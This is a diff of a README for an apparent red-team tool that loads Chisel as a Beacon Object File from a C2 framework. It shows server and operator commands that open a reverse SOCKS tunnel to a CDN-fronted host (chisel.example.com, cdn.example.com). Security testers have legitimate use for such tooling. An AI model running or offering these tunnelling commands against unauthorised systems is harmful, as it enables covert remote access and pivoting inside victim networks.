@@ -10,7 +10,7 @@ public TLS front end.
 ## Build
 Compile with Mingw64. `C:\path\to\mingw64\bin` must be in PATH. Then just run the build script:
 ```
-build.bat                                   :: or: set TOOLCHAIN=C:\path\to\mingw64\bin && build.bat
+build.bat
 ```
 
 ## Run
@@ -18,19 +18,15 @@ build.bat                                   :: or: set TOOLCHAIN=C:\path\to\ming
 Outflank Security Tooling (OST), or any Beacon-family C2 with a BOF primitive: artifact
 `chiselbof.dll`, entry point `go`, then the server URL and the remote list.
 
-Chisel's flags are ordinary arguments, passed either as more records with the dashes stripped, or
-as **one** record holding the whole command line (dashes legal there because the payload splits it;
+Chisel's flags are ordinary arguments, passed as **one** record holding the whole command line (dashes legal there because the payload splits it;
 `"` groups a value that contains a space):
-
-```
-exec_bof zzzzzz https://chisel.example.com R:1080:socks auth ops:pass keepalive 30s
-exec_bof z      "https://chisel.example.com R:1080:socks --auth ops:pass --keepalive 30s"
-```
-
-Server side, for `R:` remotes (`--auth` is chisel's own flag, checked inside SSH):
-
+Server (behind CDN -> caddy or nginx server -> localhost:8000):
 ```
 chisel server --port 8000 --reverse -v --auth "ops:pass"
+```
+OST or other C2:
+```
+exec_bof_async z      "https://cdn.example.com R:1080:socks --auth username:pass  --max-retry-count 2"
 ```
 
 ### Flags
